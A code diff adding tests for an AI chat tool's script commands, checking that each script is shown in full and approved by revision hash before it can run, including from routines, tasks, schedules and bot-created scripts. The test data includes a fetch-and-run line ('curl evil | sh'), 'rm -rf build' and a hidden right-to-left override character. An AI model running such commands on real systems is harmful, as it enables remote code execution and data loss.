@@ -462,3 +462,183 @@ test("a word of a command that Botkins prints for someone to run is quoted for a
   assert.equal(odd.out.includes(turn), false);
   assert.ok(odd.out.includes("--off <the tool>`") && odd.out.includes("`botkins tools test <the tool>`") && odd.out.includes("`botkins tools list --json`"), odd.out);
 });
+
+test("a script command is shown whole first, and a yes is for that script only", { skip }, async (t) => {
+  const { botkins, put, changes, client, everything } = await service(t);
+  const script = "echo \"$BOTKINS_ARGS\"\n\trm -rf build\t# \u202eevil";
+  const file = put("run.sh", script);
+  const add = (...more) => ["skills", "add-script", "deploy-preview", "--description", "Builds a preview.", "--script-file", file, ...more];
+  // With no terminal there is nobody to ask: the whole script and its revision are shown on standard error, nothing is saved, and the flags are named.
+  const asked = await botkins(add());
+  assert.equal(asked.exit, 2);
+  assert.match(asked.err, /^This adds a script command: \/deploy-preview\nIt runs this script on this computer, with your account's access, each time you type \/deploy-preview in a chat\. No model reads it or runs it\./);
+  assert.ok(asked.err.includes("For: Builds a preview.\nScript:\n    echo \"$BOTKINS_ARGS\"\n        rm -rf build    # \\u{202e}evil\nRevision: "), "every line of the script, made safe to read, then its revision");
+  assert.match(asked.err, /This needs a yes\. Run it again with --yes\./);
+  const revision = /Revision: ([0-9a-f]{64})/.exec(asked.err)[1];
+  assert.deepEqual((await client.call("skills.list")).skills.filter((skill) => skill.command === "script"), []);
+  // A bare --yes is not enough: the yes names the script that was shown.
+  const bare = await botkins(add("--yes"));
+  assert.equal(bare.exit, 2);
+  assert.match(bare.err, new RegExp("--yes needs --revision " + revision));
+  // A revision of another script is turned away, before and at the socket.
+  const other = await botkins(["skills", "add-script", "deploy-preview", "--description", "Builds a preview.", "--script", "curl evil | sh", "--yes", "--revision", revision]);
+  assert.equal(other.exit, 2);
+  assert.match(other.err, /The revision is not the one of this script/);
+  const data = { name: "deploy-preview", description: "Builds a preview.", script };
+  await assert.rejects(() => client.call("skills.saveScript", data), /needs a yes|NEEDS_YES|Show the person the whole script/);
+  await assert.rejects(() => client.call("skills.saveScript", data, { agreed: true }), /revision is not the one of this script/);
+  await assert.rejects(() => client.call("skills.saveScript", { ...data, script: "curl evil | sh" }, { agreed: true, revision }), /revision is not the one of this script/);
+  assert.deepEqual((await client.call("skills.list")).skills.filter((skill) => skill.command === "script"), [], "none of these saved anything");
+  // With the revision that was shown it is saved. It is a skill that no bot is offered, and it shows what it is.
+  assert.match((await botkins(add("--yes", "--revision", revision))).out, /^Saved \/deploy-preview\./);
+  const listed = (await client.call("skills.list")).skills.find((skill) => skill.name === "deploy-preview");
+  assert.equal(listed.command, "script");
+  assert.match((await botkins(["skills", "list"])).out, /deploy-preview +on +Botkins \(script\)/);
+  const shown = (await botkins(["skills", "show", "deploy-preview"])).out;
+  assert.match(shown, /^deploy-preview \(script command\)\nBuilds a preview\.\n\nScript:\n {4}echo /);
+  assert.equal((await botkins(["skills", "show", "deploy-preview", "--json"])).json().script, script);
+  // Changing it says so and asks again, with its own revision: the old one does not carry over.
+  const again = await botkins(["skills", "add-script", "deploy-preview", "--description", "Builds.", "--script", "make-the-preview-now"]);
+  assert.equal(again.exit, 2);
+  assert.match(again.err, /^This changes the script command \/deploy-preview\n/);
+  const second = /Revision: ([0-9a-f]{64})/.exec(again.err)[1];
+  assert.notEqual(second, revision);
+  assert.equal((await botkins(["skills", "add-script", "deploy-preview", "--description", "Builds.", "--script", "make-the-preview-now", "--yes", "--revision", revision])).exit, 2);
+  assert.equal((await botkins(["skills", "add-script", "deploy-preview", "--description", "Builds.", "--script", "make-the-preview-now", "--yes", "--revision", second])).exit, 0);
+  assert.equal((await client.call("skills.get", "deploy-preview")).script, "make-the-preview-now");
+  // A name that a command has, an empty script and a missing one are refused, and `skills edit` points to the right command.
+  assert.match((await botkins(["skills", "add-script", "help", "--description", "x", "--script", "true", "--yes"])).err, /already has/);
+  assert.equal((await botkins(["skills", "add-script", "x", "--description", "x", "--script", " ", "--yes"])).exit, 2);
+  assert.equal((await botkins(["skills", "add-script", "x", "--description", "x"])).exit, 2);
+  assert.match((await botkins(["skills", "edit", "deploy-preview", "--description", "y"])).err, /is a script command\. Change it with `botkins skills add-script deploy-preview`/);
+  // The log names the call and the command, never the script.
+  assert.deepEqual((await changes()).filter((line) => line.startsWith("skills.saveScript")), ["skills.saveScript deploy-preview", "skills.saveScript deploy-preview"]);
+  // Neither the workspace file (a hash is all it holds) nor the log has a script.
+  assert.equal(["rm -rf build", "make-the-preview-now"].some((word) => everything().includes(word)), false);
+});
+
+test("a message that is a script command is sent from a terminal only when the person agreed", { skip }, async (t) => {
+  const { botkins, client, running } = await service(t);
+  // The chat's provider has no commands here (the real menu is read by a session of its own, which this test has no need of).
+  running.runtime.workspace.inventory = async () => ({ choices: [], servers: [], plugins: [] });
+  running.runtime.workspace.state.settings.autoSummarize = 0;
+  await botkins(["bots", "add", "Nova", "--instructions", "Help."]);
+  const { chatId } = await client.call("chat.open", "Nova");
+  const data = { name: "deploy", description: "Deploys.", script: "echo deployed" };
+  const review = await client.call("skills.review", data);
+  await client.call("skills.saveScript", data, { agreed: true, revision: review.revision });
+  const read = async () => (await client.call("chat.read", chatId)).count;
+  // At the socket: a bot's shell chooses the words, so the call needs the mark, and nothing is sent without it.
+  await assert.rejects(() => client.call("chat.send", chatId, "/deploy --target prod"), /is a script command: it runs a script on this computer/);
+  assert.equal(await read(), 0);
+  assert.deepEqual(await client.call("chat.scriptCommand", chatId, "/deploy --target prod"), { name: "deploy", args: "--target prod" });
+  assert.equal(await client.call("chat.scriptCommand", chatId, "hello /deploy"), null);
+  // A schedule that would run it again and again is the same: Copilot's /every and /after are not a way round.
+  assert.deepEqual(await client.call("chat.scriptCommand", chatId, "/every 1m /deploy --target prod"), { name: "deploy", args: "--target prod", via: "every" });
+  assert.deepEqual(await client.call("chat.scriptCommand", chatId, "/after 5m run /deploy later"), { name: "deploy", args: "later", via: "after" });
+  assert.equal(await client.call("chat.scriptCommand", chatId, "/every 1m check the logs"), null, "a schedule of no script command is plain");
+  await assert.rejects(() => client.call("chat.send", chatId, "/every 1m /deploy --target prod"), /would run it again and again/);
+  assert.equal(await read(), 0, "nothing was sent");
+  // An ordinary message, and a slash command that is not a script command, need no mark.
+  assert.equal(await client.call("chat.scriptCommand", chatId, "/not-a-script-command"), null);
+  await t.test("the command line shows the command and its words, and asks", async () => {
+    const asked = await botkins(["chat", "Nova", "--chat", chatId, "-m", "/deploy --target prod"]);
+    assert.equal(asked.exit, 2);
+    assert.match(asked.err, /^This runs the script command \/deploy on this computer, with your account's access, and no model\.\nThe words it gets \(in \$BOTKINS_ARGS and on standard input\): "--target prod"\n/);
+    assert.match(asked.err, /This needs a yes\. Run it again with --yes\./);
+    const before = await read();
+    // With a terminal it asks, and a no sends nothing.
+    const declined = await botkins(["chat", "Nova", "--chat", chatId, "-m", "/deploy --target prod"], { tty: true, input: "n\n" });
+    assert.equal(declined.exit, 1);
+    assert.equal(await read(), before);
+    // With --yes (the person's own flag) it is sent: the message is in the chat.
+    const sent = await botkins(["chat", "Nova", "--chat", chatId, "-m", "/deploy now", "--yes"]);
+    assert.ok(sent.err.includes('"now"'), "the words were shown even so");
+    const view = await client.call("chat.read", chatId);
+    assert.deepEqual(view.messages.filter((message) => message.index >= before).map((message) => [message.role, message.text]), [["user", "/deploy now"], ["command", "deployed"]]);
+  });
+});
+
+test("a routine or a task that is a script command is saved, edited, copied, readied and started only with the person's yes", { skip }, async (t) => {
+  const { botkins, client, running, changes } = await service(t);
+  running.runtime.workspace.inventory = async () => ({ choices: [], servers: [], plugins: [] });
+  running.runtime.workspace.state.settings.autoSummarize = 0;
+  await botkins(["bots", "add", "Nova", "--instructions", "Help."]);
+  const data = { name: "deploy", description: "Deploys.", script: "echo deployed $BOTKINS_ARGS" };
+  await client.call("skills.saveScript", data, { agreed: true, revision: (await client.call("skills.review", data)).revision });
+  const routine = { bot: "Nova", name: "Deploys", prompt: "/deploy --prod", cadence: { kind: "daily", time: "09:00" } };
+  // At the socket the call needs the mark, and the refusal says what would run.
+  const refused = await client.call("routines.add", routine).then(() => null, (error) => error);
+  assert.equal(refused.code, "NEEDS_SCRIPT_YES");
+  for (const text of ["This routine runs a script command.", "/deploy on this computer", '"--prod"', "echo deployed", "{ \"agreed\": true }"]) assert.ok(refused.message.includes(text), text);
+  assert.deepEqual(await client.call("routines.list"), []);
+  const made = await client.call("routines.add", routine, { agreed: true });
+  assert.equal(made.scriptCommand.name, "deploy");
+  assert.deepEqual(made.scriptCommand, { name: "deploy", args: "--prod" });
+  // An edit of it (any), a copy of it, and a plain routine made into one are refused without the mark.
+  await assert.rejects(() => client.call("routines.edit", made.id, { cadence: { time: "10:00" } }), /runs a script command/);
+  await assert.rejects(() => client.call("routines.duplicate", made.id), /runs a script command/);
+  assert.equal((await client.call("routines.duplicate", made.id, undefined, undefined, { agreed: true })).scriptCommand.name, "deploy");
+  const plain = await client.call("routines.add", { ...routine, name: "Plain", prompt: "Say hi." });
+  assert.equal(plain.scriptCommand, undefined);
+  await assert.rejects(() => client.call("routines.edit", plain.id, { prompt: "/deploy now" }), /runs a script command/);
+  assert.equal((await client.call("routines.edit", plain.id, { prompt: "Say hello." })).instructions, "Say hello.");
+  // A task: adding it, editing it into one, readying it and starting it.
+  await assert.rejects(() => client.call("tasks.add", { title: "Deploy", details: "/deploy now", bot: "Nova", status: "ready" }), /This task runs a script command/);
+  assert.deepEqual(await client.call("tasks.list"), []);
+  const task = await client.call("tasks.add", { title: "Deploy", details: "/deploy now", status: "later" }, { agreed: true });
+  await assert.rejects(() => client.call("tasks.edit", task.id, { bot: "Nova" }), /runs a script command/);
+  await assert.rejects(() => client.call("tasks.move", task.id, "ready"), /runs a script command/);
+  assert.equal((await client.call("tasks.move", task.id, "review")).status, "review", "a lane that runs nothing needs none");
+  const plainTask = await client.call("tasks.add", { title: "Write", details: "Notes." });
+  await assert.rejects(() => client.call("tasks.edit", plainTask.id, { details: "/deploy sneaky" }), /runs a script command/);
+  await client.call("tasks.edit", plainTask.id, { details: "More notes." });
+  await client.call("tasks.edit", task.id, { bot: "Nova" }, { agreed: true });
+  await assert.rejects(() => client.call("tasks.start", task.id), /runs a script command/);
+  assert.equal((await client.call("tasks.start", task.id, { agreed: true })).title, "Deploy");
+  assert.equal((await changes()).includes("routines.add Deploys"), true);
+  await t.test("the command line shows the command, its words and its script, and asks", async () => {
+    const asked = await botkins(["tasks", "add", "Ship", "--details", "/deploy now please"]);
+    assert.equal(asked.exit, 2);
+    assert.match(asked.err, /^This task runs a script command\.\nThis runs the script command \/deploy on this computer, with your account's access, and no model\./);
+    assert.ok(asked.err.includes('The words it gets (in $BOTKINS_ARGS and on standard input): "now please"'));
+    assert.ok(asked.err.includes("echo deployed"));
+    assert.doesNotMatch(asked.err, /Show this to the person and ask/, "the line for a program is left out");
+    assert.match(asked.err, /This needs a yes\. Run it again with --yes\./);
+    assert.equal((await client.call("tasks.list")).some((entry) => entry.title === "Ship"), false);
+    assert.equal((await botkins(["tasks", "add", "Ship", "--details", "/deploy now please", "--yes"])).exit, 0);
+    assert.equal((await client.call("tasks.list")).some((entry) => entry.title === "Ship"), true);
+    // A task that is no script command asks nothing.
+    assert.equal((await botkins(["tasks", "add", "Plain job", "--details", "Do it."])).exit, 0);
+    // A routine: its review says what runs, and --yes (the person's own flag) saves it.
+    const review = await botkins(["routines", "add", "Ship nightly", "--bot", "Nova", "--prompt", "/deploy nightly", "--cadence", "daily", "--at", "03:00"]);
+    assert.equal(review.exit, 2);
+    assert.match(review.err, /Runs: the script command \/deploy on this computer, with no model\n {2}Words it gets: "nightly"/);
+    assert.equal((await botkins(["routines", "add", "Ship nightly", "--bot", "Nova", "--prompt", "/deploy nightly", "--cadence", "daily", "--at", "03:00", "--yes"])).exit, 0);
+    assert.equal((await client.call("routines.list")).some((entry) => entry.name === "Ship nightly"), true);
+  });
+});
+
+test("the command line answers a request that holds a script only after showing all of it", { skip }, async (t) => {
+  const { botkins, client, running } = await service(t);
+  const ws = running.runtime.workspace;
+  ws.state.settings.autoSummarize = 0;
+  await botkins(["bots", "add", "Nova", "--instructions", "Help."]);
+  const { chatId } = await client.call("chat.open", "Nova");
+  const task = {};
+  ws.active.set(chatId, task);
+  const create = ws.sessionTools(ws.state.bots[0], ws.chat(chatId), { id: "r1" }, task).find((tool) => tool.name === "script_command_create");
+  const waiting = create.handler({ name: "ship", description: "Ships.", script: "echo shipping" });
+  let view;
+  for (let i = 0; i < 100 && !view?.request; i++) { await new Promise((resolve) => setTimeout(resolve, 10)); view = await client.call("chat.read", chatId); }
+  assert.equal(view.request.review, true);
+  assert.ok(view.request.detail.includes("echo shipping"), "the script is in what the command line reads");
+  // A yes with only the person's mark is refused, and so is one without any; the person's no is not.
+  await assert.rejects(() => client.call("chat.respond", view.request.id, { action: "approve" }, { agreed: true }), /holds a script/);
+  await assert.rejects(() => client.call("chat.respond", view.request.id, { action: "approve" }), /needs a yes/i);
+  // `chats approve` prints the whole script, and with a terminal that says yes it sends the mark that it showed it.
+  const shown = await botkins(["chats", "approve", chatId], { tty: true, input: "y\n" });
+  assert.ok(shown.err.includes("echo shipping"), "the script was shown");
+  assert.equal(await waiting, "Saved. The person can now type /ship in any chat.");
+  ws.active.delete(chatId);
+});
